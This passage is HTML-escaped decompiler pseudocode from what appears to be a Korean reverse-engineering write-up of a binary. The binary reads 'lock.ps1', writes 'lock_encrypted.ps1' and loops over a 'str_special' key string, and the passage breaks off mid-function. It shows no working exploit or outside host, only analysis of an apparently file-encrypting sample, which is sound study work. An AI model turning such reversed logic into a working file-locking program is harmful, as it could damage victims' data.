  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp-Ch] [ebp-1B4h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp-Ch] [ebp-1B4h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp-8h] [ebp-1B0h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp-8h] [ebp-1B0h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp-4h] [ebp-1ACh]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp-4h] [ebp-1ACh]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+20h] [ebp-188h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+24h] [ebp-184h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+DCh] [ebp-CCh] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+18Ch] [ebp-1Ch] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+194h] [ebp-14h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+1A4h] [ebp-4h]&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str__lock_ps1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFu&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;str__lock_ps1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str__lock_ps1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_404210&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str__lock_ps1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifstream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vftable&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v25&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str__lock_encrypted_ps1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFu&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;str__lock_encrypted_ps1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str__lock_encrypted_ps1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_403CB0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str__lock_encrypted_ps1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ofstream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vftable&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                              &lt;span class=&quot;c1&quot;&gt;// 여기까지 v21과 v22에 각자 파일 내용을 넣는 것 같음&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Block_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sub_405940&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Block_1_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Block_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFu&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
